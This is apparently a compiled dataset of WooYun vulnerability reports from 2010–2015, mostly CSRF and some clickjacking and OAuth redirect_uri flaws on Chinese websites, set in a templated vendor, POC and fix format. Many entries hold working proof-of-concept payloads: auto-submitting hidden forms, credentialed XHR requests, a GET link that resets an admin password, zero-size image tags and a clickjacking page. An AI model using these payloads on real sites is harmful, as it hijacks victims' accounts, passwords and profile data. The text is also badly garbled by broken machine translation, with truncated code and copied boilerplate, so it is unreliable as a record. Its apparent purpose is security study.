**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: <form method="POST" name="form0" action="https://example.com/[redacted]"><input type="hidden" name="MAddressInfo.AddressId" value=""/><input type="hidden" name="MAddressInfo.UserId" value=""/><input type="hidden" name="MAddressInfo.TrueName" value="dfsadf"/><input type="hidden" name="pro

**Bypass**: Direct exploitation

**Fix**: 1,addforsourceauthentication2,token
---

---
### [wooyun-2014-072681] textsiteoftextSitestartranslated textcanCSRFmodifyadministratorpassword
**Vendor**: textsiteoftext | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: WooYun: textsiteoftextsensitivefunctionalitycsrf candumpdatadatabaseforforthistextinVendorreplytranslated text,againcomeone locationCSRFtextunderVendor.textrecommendcheckunderCSRFtext./admin/index.php?_m=mod_user&_a=admin_update&user[id]=1&passwd[passwd]=123123&passwd[re_passwd]=123123&user[email]=admin@admin.com&user[active]=1&user[s_role]=admin&user[full_name]=&user[mobile]=&submit=%E4%BF%9D%E5%AD%98thislinkdirectlymodifyadministratorpasswordas123123

**POC**: /admin/index.php?_m=mod_user&_a=admin_update&user[id]=1&passwd[passwd]=123123&passwd[re_passwd]=123123&user[email]=admin@admin.com&user[active]=1&user[s_role]=admin&user[full_name]=&user[mobile]=&submit=%E4%BF%9D%E5%AD%98

**Bypass**: Direct exploitation

**Fix**: defenseCSRF,addtexttoken
---

---
### [wooyun-2013-033363] Renrenone locationcsrfvulnerability(look attextnottext?translated text)
**Vendor**: Renren | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a.textcomelook atTitletext,thenis"addtextnamedsingle"thisoperationhasCSRF vulnerability.log inusertextquestion https://example.com/[redacted] useafter,thenwillputidasxxxxxxuseraddtextnamedsingle.addtextnamedsingleeffectthenisiftextcopyisfriendtranslated textfriend,thenwilltextnottothisuseradd friendsrequest.siteinsidetextseemstextwilltextnotto~b.texttriggerCSRFfunctionalitythenistext"text".whentextonetranslated text,textwilltryparsetext,textTitleandcontentuseandimage.itsinimagetextafterdirectlyoutputtofriendinformationtextinside,foristhisimagethencantextcometexttrigger.forforonefriendnumberas1000textusercometext,triggereffectnotonetext~ useandifthistranslated texthastranslated text,benottranslated textif,effectwillenteronetranslated text.text,textcanusecometriggerothertext......for examplecanexploittextfriendcometranslated text(GET),translated textquestiontextetc.etc....... textusetextcanusecometranslated textiOStextclienttoken..////////

**POC**: a. addtextnamedsingle..textquestionunderaddressthencantext,nottranslated text......b. testBwhenIthennotusetext..textselftextcometext..1) constructoneas followspagepageinsidehas peopletextimg(translated textfoundissue=w=translated textuseaftertext301textthattheneffecttextgood~2) textoneunder3) foristexttotranslated text..browserrequestthistext"image"(IforimageExecutiononeunder301text~ browsertextonwilltextquestionIhomepage)(text:translated textimagehas peopleonerrortranslated textDOM #*&(#&*$,solook atDOMislook atnottoimage..)iftextfoundtextfriend/selfProfiletranslated textappearthesetext,thisistranslated text?

**Bypass**: Direct exploitation

**Fix**: a. youtextItextb. youtextItext,textimageinservertextoneundertext peopletranslated textthenline.textinhomepagetextimagetextina certain sometextunderalreadythis waytext,buttranslated text <- <-
---

---
### [wooyun-2013-019051] a certain social platforma certain social platformmobile versiontwolocationcsrfvulnerability,cantextsenda certain social platform,follow/add followiftext
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: clicklinkhttps://example.com/[redacted]

**POC**: clicklinkhttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: 1-textfollowa certain social platforma certain social platform@1OO0O2-thenthese twofunctionalitylinkinsidetextaddst=****validationNo.onetextcantranslated text
---

---
### [wooyun-2013-025820] againtexta certain social platformcsrfboost followers
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1)look attextwhen,textlook attext,translated textonshouldallhas,textonepersonaldirectlyGETrequest;https://example.com/[redacted]

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: youtokentext
---

---
### [wooyun-2014-054896] translated text-a certain Internet company OAuth 2.0 redirect_uir CSRF vulnerability
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text-a certain Internet company OAuth 2.0 during the authentication flowhttps://example.com/[redacted]

**POC**: iflog intranslated textusertextpointthisrequest. translated textwillputuserredirecttohomepage.thenweenterbindinheartcanfound,bindsuccess

**Bypass**: Direct exploitation

**Fix**: recommendVendortexthastextmethodcomeresisttextfor OAuth 2.0 redirect_uir CSRF attack.for example:1. inputuseraccountbindtextNo.threetextaccountbefore,force the user to re-enteraccountpassword.textpoint: willsacrifice user experience. becauselargetextnumberuserinlog inuseafter,isnottextagaininputpassword.2. throughvalidation referervaluecomeresistCSRF attack,
---

---
### [wooyun-2014-087927] translated textone locationCSRFtextfollow
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: POST /weibo/follow?&u=t&lg=n&uid=49679472 HTTP/1.1Host: f.lefeng.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestReferer: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0128568] translated textmultiple locationshascsrf
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]"POST", "https://example.com/[redacted]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("borthday=2015-07-10&skin=0&weight=55.0&height=170.0&blog=99999999999999999&weibo=

**POC**: poc####textlink,textcode is as follows:xmlhttp.open("POST", "https://example.com/[redacted]", true); xmlhttp.withCredentials = true; xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded"); xmlhttp.send("borthday=2015-07-10&skin=0&weight=55.0&height=170.0&blog=99999999999999999&weib

**Bypass**: Direct exploitation

**Fix**: validationrefereraddtoken
---

---
### [wooyun-2012-08609] a certain portal siteone locationCSRF vulnerability
**Vendor**: a certain portal site | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="msg" value="XXXXXXXXXXXXXX" /><input type="submit" value="submit" /></form><script>document.imlonghao.submit();</script></body></htm

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2013-042571] texttenonea certain e-commerce platformforumtext"routerCSRF"maliciousattackcode(otherforumcancanonetextaffected)
**Vendor**: a certain e-commerce platformtext | **Year**: 2013 | **Type**: textfraudinformation

**Meta-thinking**: Trigger signal: functional testing

**Insight**: textfraudinformation lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify textfraudinformation-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textaddressisthis:https://example.com/[redacted]

**POC**: textpagecodetext peopletext<div class='ke-post'><p>translated text!</p><p><img height="0" src="https://example.com/[redacted]" style="height: 0.0px;width: 0.0px;float: none;margin: 0.0px;" width="0"/></p><p><img height="0" src="https://example.com/[redacted]" style="height: 0

**Bypass**: Direct exploitation

**Fix**: a certain e-commerce platformtextnot?
---

---
### [wooyun-2015-0106697] Xiangshe.comone locationone issueCSRF
**Vendor**: Xiangshe.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: <form method="POST" name="form0" action="https://example.com/[redacted]"><input type="hidden" name="MAddressInfo.AddressId" value=""/><input type="hidden" name="MAddressInfo.UserId" value=""/><input type="hidden" name="MAddressInfo.TrueName" value="sadfsdf"/><input type="hidden" name

**Bypass**: Direct exploitation

**Fix**: 1,textsource2,token
---

---
### [wooyun-2013-035239] TianyaCSRFtextone:texthijackusertextnamedsingleoperationpermissions
**Vendor**: Tianyacommunity | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Cross-siterequestforgery vulnerability,hijackusertextnamedsingleoperation,arbitraryoperationtranslated textnamedsingle.vulnerabilityproveputtranslated textexploitthisvulnerability.

**POC**: textcapture packets,IfoundonetexthastextGETrequesthttps://example.com/[redacted])soweinarticletextinsideclicktextimage(heretextoneunder,TianyablogprogramtextisASP)wetextdirectlytexthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: CSRFdefenseyoucancheckoneundertranslated text.for exampleaddtexttoken
---

---
### [wooyun-2013-017636] a certain social platformSAEtextdeveloperauthenticationCSRF
**Vendor**: a certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.intextlinkaftertextadd&makesure=1,thentoa certain social platformdeveloperforumreplytextundertextcode,textinlog inSAEtextunderopenhasthiscodepostwilltranslated textspecified user.[img=1,1]https://example.com/[redacted]]2.texthttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: filterBypass

**Fix**: you know what to do
---

---
### [wooyun-2015-0129539] a certain translated textCSRF vulnerabilitytextinformationbetext
**Vendor**: a certain translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="memberAttribute&#95;1" value="decode error#152;&#191;decode error#144;&#168;decode error#190;&#190;" /><input type="hidden" name="memberAttribute&#95;2" value="male" /><input type="hidden" name="memberAttribute&#95;3" value="2015&#45;07&#45;09" /><input type="hidden" name="memberAttri

**POC**: https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="memberAttribute&#95;1" value="decode error#152;&#191;decode error#144;&#168;decode error#190;&#190;" /><input type="hidden" name="memberAttribute&#95;2" value="male" /><input type="hidd

**Bypass**: Direct exploitation

**Fix**: textcometext
---

---
### [wooyun-2014-071676] usetextonelowtextvulnerabilitytranslated textusermobile phoneadmin backendtranslated textandinstallarbitrarytextuse
**Vendor**: translated text | **Year**: 2014 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface, admin backendmanagement

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textsubmitone:WooYun: useonelowtextvulnerabilitytranslated textusermobile phoneadmin backendtranslated textandinstallarbitrarytextusethisisCSRFtexttogetherissue,translated textsecurityintexthasoneandCSRFisgoodbrotherVulnerability type:Clickjacking(clickhijack)is onetranslated text,inwebtextthenisiframetextonetextnotcantextpage,textuserinnottranslated textunder,clickattackertranslated textuserclicktextthroughtesting foundwandoujia.comtextunderallwebsiteallnoforClickJackingtextprotection,textyouFixCSRF,exploitthisvulnerabilitytextiscancausesametextattackeffect.#POCconstructtextinmobile phoneclientinstalltranslated textlog inusercanthroughtranslated textwebpagetextselfmobile phonenodatatranslated textuse,translated text,butbecausenoforClickJackingtexthasdefense,canconstructPOCwebpagemaliciouswebpagehascancanis onewebpagegame,texthascancanis onetranslated textpage,as follows:look atontextis justtextpage,butitstextthispageundertextoverwriteonetext,weputtexthostthistextsetas

**POC**: POCcode:link: https://example.com/[redacted] password: qgu5*translated textuse,notextfortext,textattacktogethercomecantranslated text,texttotexteffect

**Bypass**: Direct exploitation

**Fix**: textinsideseverallargetypewebsitetextbusinessallnotextClickJackingdefense,cancanisbecause"attacktextcopytext",butonetextbeexploit,textwillcausenottextimpact,sendthistranslated textonetextisasproveClickJackingnotonlyiscanusecometextselfa certain social platforma certain social platformtextboost followersVulnerability type.JSdefensetext(texthearttextistranslated textwhetherinwebpagetranslated text)<head><
---

---
### [wooyun-2014-054895] translated textcomputertext-a certain e-commerce platform OAuth 2.0 redirect_uir CSRF vulnerability
**Vendor**: translated textcomputertext | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated textcomputertext-a certain e-commerce platform OAuth 2.0 during the authentication flowhttps://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: recommendVendortexthastextmethodcomeresisttextfor OAuth 2.0 redirect_uir CSRF attack.for example:1. inputuseraccountbindtextNo.threetextaccountbefore,force the user to re-enteraccountpassword.textpoint: willsacrifice user experience. becauselargetextnumberuserinlog inuseafter,isnottextagaininputpassword.2. throughvalidation referervaluecomeresistCSRF attack,
---

---
### [wooyun-2012-08611] a certain Internet companyone locationCSRF vulnerability
**Vendor**: a certain Internet company | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="content" value="XXXXXXXXXXX" /><input type="submit" value="submit" /></form><script>document.imlonghao.submit();</

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2015-0114402] texta certain one locationcsrf
**Vendor**: texta certain e-commerce platformelectronictexthastextcompany | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="folderName" value="&#x59B9;&#x7EB8;&#xFF0C;&#x6765;&#x4E00;&#x70AE;&

**Bypass**: Direct exploitation

**Fix**: 1:add atoken translated text..Itextforprogramtext,textonetext peopletext,nottextIalltranslated textintextcloudtext
---

---
### [wooyun-2014-088283] csdna certain businesscsrfdeletecomment
**Vendor**: CSDNdevelopercommunity | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: commentcontentcanenterlinearbitrarydelete,exploitcsrfvulnerability~textauthortranslated textselfsetgoodpage~~commentidintextcodeincantextto as shown:thenwe directly onetextifhtmldel={textdeletecommentid}<img src="https://example.com/[redacted]">clickok text~~~

**POC**: as abovetext~~~

**Bypass**: Direct exploitation

**Fix**: Fixunderthis kind ofTypeissue~~~
---

---
### [wooyun-2013-024976] 115textprofilemodifyhascsrf
**Vendor**: translated texthastextcompany | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: profilehere,postitstextusegettextline..totextsendtexthttps://example.com/[redacted] usetranslated texthas..puttextusetextthentranslated texthasno??

**POC**: hostalltext,textcopyallsitegoodtranslated textallhas,notoneonetext..translated text peopletextwill..

**Bypass**: Direct exploitation

**Fix**: text,refer,getcheck..
---

---
### [wooyun-2015-0125759] translated textunderwebsitetextCSRF vulnerability(textfollow)
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]  look attotext,wetexttwo peopleaccount.thenlook attohasfollow,OK,capture packetslook atunder.weconstructpocwetext peopleaccountlog in

**POC**: textlook atundertext followsuccess

**Bypass**: Direct exploitation

**Fix**: addtokenthencan
---

---
### [wooyun-2015-096715] textundertranslated textundertextAPPtextnotwhencancausingcsrftext
**Vendor**: tixa.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: VendortextItextphone,andtextforvulnerabilitytentextfollow,textonewecometextAPPputIsend peoplewooyuntext,putdatatextnext,textnottoistextisGETrequest= =welook atunder/api_utf/mutual/mShout/replyMShout.jsp?accountId=234641&spaceId=5&receiverAccountId=234678&commentContent=wooyun&appId=327443&appType=80&title=wooyun&lat=23.118978&lng=114.431373&address=%E5%B9%BF%E4%B8%9C%E7%9C%81%E6%83%A0%E5%B7%9E%E5%B8%82%E6%83%A0%E5%9F%8E%E5%8C%BA%E4%BA%91%E5%B1%B1%E4%B8%9C%E8%B7%AF8%E5%8F%B7&fileType=0&file

**POC**: VendortextItextphone,andtextforvulnerabilitytentextfollow,textonewecometextAPPputIsend peoplewooyuntext,putdatatextnext,textnottoistextisGETrequest= =welook atunder/api_utf/mutual/mShout/replyMShout.jsp?accountId=234641&spaceId=5&receiverAccountId=234678&commentContent=wooyun&appId=327443&appType=80&title=wooyun&lat=23.118978&lng=114.431373&address=%E5%B9%BF%E4%B8%9C%E7%9C%81%E6%83%A0%E5%B7%

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2015-0139645] Nationaltranslated textundertranslated textone locationcsrfarbitrarymodifybindmobile phonenumberandemail
**Vendor**: a certain translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: vulnerabilityhastwolocation,hasforaccountmanagementmodifybindemailandmodifybindmobile phonenumberlocationvulnerabilityurl:https://example.com/[redacted]

**POC**: look atIprove:1.arbitrarymodifybindemailItextonepocform,textnamed:phoneOpenUpdate.html,translated text timessetemailrequest,inlocaltext peopleserver,textquestionaddress:http://[IP redacted]

**Bypass**: Direct exploitation

**Fix**: thistwolocationvulnerabilityurltextgoodcodetext:https://example.com/[redacted]
---

---
### [wooyun-2011-03863] mobile phoneRenrenCSRF
**Vendor**: Renren | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.3g.renren.comrefererchecktranslated text,onlytextishttps://example.com/[redacted]

**POC**: textthentext..

**Bypass**: Direct exploitation

**Fix**: checkreferer!!!textcopy<translated text>look atlook at!!!
---

---
### [wooyun-2012-04537] CSRFcausinga certain social platformtextusetranslated text
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain social platforma certain social platformforforNo.threetextusetextusea certain social platformdata,isuseOAuthprotocolenterlineauthentication.No.threetextuseneeduseuserdatatext,needuserlog inafterclicktranslated textcanenterline.buttextfortranslated textsubmitformdataallcantext,textthisusecsrf,constructtextformtextsubmit,then cantextalreadylog inuserinnottranslated textundertextNo.threetextuse.

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: translated textaddtokenetc.translated text
---

---
### [wooyun-2010-0768] 37wan.comwebpagegame platformCSRF vulnerability(canchangeuserpassword)
**Vendor**: 37wan | **Year**: 2010 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.etc.textuserlog inafter,textclickconstructpage(textcaningametextinsideconstructlink),canCSRFmodifyuserpasswordtextissueandtext.2.inrecoverpasswordfunctionalityinsideinputpasswordtranslated textcan modifyuserpassword.3.then......~_^

**POC**: CSRFformcode:<form action="https://example.com/[redacted]" method="post"><input type="hidden" name="action" value="updateInfo" /><input type="hidden" name="name" value="pig" /><input type="hidden" name="id_card_number" value="110101198601011615" /><input type="hidden" name="question" value="textistext?"

**Bypass**: Direct exploitation

**Fix**: 1.change passwordissueandtranslated textneedinputpassword2.adduseroperationvalidationtext:itstextwebpagegame platformtextlargetexthasthistextissue~~
---

---
### [wooyun-2015-0158299] a certain social platforma certain social platformone locationCSRFcanboost followers
**Vendor**: a certain social platforma certain social platform | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: <!DOCTYPE HTML><html><body><form id="demo" name="demo" action="https://example.com/[redacted]" method="POST"><input type="text" name="uid" value="3975359730" /><input type="text" name="ispage" value="1" /><input type="text" name="_t" value="0" /><input type="submit" value="submit" /></f

**Bypass**: Direct exploitation

**Fix**: ..
---

---
### [wooyun-2015-0128938] textmultiple locationsCSRF vulnerability
**Vendor**: epeaksport.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="nickName" value="wooyun" /><input type="hidden" name="remark" value="wooyun" /><input type="hidden" name="theName" value="wooyun" /><input type="hidden" name="theSex" value="" /><input type="hidden" name="telephone" value="" /><input type="h

**POC**: modifyshipping address<html><body><form action="https://example.com/[redacted]" method="POST"><input type="hidden" name="addressProvince" value="01&#46;14" /><input type="hidden" name="addressCity" value="01&#46;14&#46;01" /><input type="hidden" name="addressCounty" value="01&#46;14

**Bypass**: Direct exploitation

**Fix**: goodtext
---

---
### [wooyun-2015-0129972] Zealer_CSRF_text,text,post,comment(withwormPOC)
**Vendor**: ZEALER | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Ithentextsingletranslated text,translated textcommunity(https://example.com/[redacted]

**POC**: <html><body><script>function submitRequest(){var xhr = new XMLHttpRequest();xhr.open("POST", "https://example.com/[redacted]", true);xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");xh

**Bypass**: Direct exploitation

**Fix**: 1,addtokentext;2,textreferertextnamedsingle.
---

---
### [wooyun-2013-019683] a certain social platformclickhijacking(nottextbetranslated text)
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textontextisthis wayitstextisthis wayclickafterthenisthis wayisinon timesowasp 2012hostlook atto,texttriedunder,resulttextiscanof course,thisonlyis onetextexample,textcanenterlineotheroperation.cantranslated text,thenlook attranslated text.for exampletextcompletelycantextsendsometextgame,text"istextthenputtranslated text","translated text"etc.textgamecometemptationtext"text"click.texthasonea certain social platformcsrf worm,completelycanusethis kind ofmethodtextusertextKaixin,textcantranslated textthiscsrf worm.textof,textonetranslated text.

**POC**: <html><head><title>a certain social platformclickjacking</title><script>function showHide_frame() {var text_1 = document.getElementById("target");text_1.style.opacity = this.checked ? "0.5": "0";text_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" + (this.checked ? "50": "0") + ");"}</script></head><

**Bypass**: Direct exploitation

**Fix**: deny sameorigin
---

---
### [wooyun-2014-061997] a certain social platformBypassCSRFdefense(securitytranslated text)
**Vendor**: a certain portal site | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain social platformcsrfcheckrefererhasissuecanusehttps://example.com/[redacted]

**POC**: createhtml<body><form action="https://example.com/[redacted]" method="POST"><input type=hidden name="msg" value="hello everybody"></form><script>document.forms[0].submit();</script></body>inwebsitecreateonewww.sohu.comdirectory puthostthishtmltextininsidetextexamplehttps://example.com/[redacted]

**Bypass**: filterBypass

**Fix**: referertext
---

---
### [wooyun-2015-0125160] translated text csrfone issue textmodifytextshipping address
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: modifyshipping address1,checklook atdatapacketmodifysuccess:texthtml,main code:xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("address_name=woo88&address_area_province=51&address_area_city=1007&address_area_area=5370&address_area_town=68025&address_deliver_detail=iuh

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: addtokenvalidationreferer
---

---
### [wooyun-2014-055075] translated text-Renren OAuth 2.0 redirect_uir CSRF vulnerability
**Vendor**: intranslated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text-Renren OAuth 2.0 during the authentication flowhttps://example.com/[redacted] CSRF attack.ifattackerrestartonetranslated text-Renren  OAuth 2.0 authenticationrequest,andinterceptOA

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2012-09502] a certain social platforma certain social platformone locationCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.vulnerabilitytextallislocationintranslated textthissite.https://example.com/[redacted]

**POC**: =========follow/add followvulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="uid" value="1747906692" /></form><script>document.imlonghao.submi

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
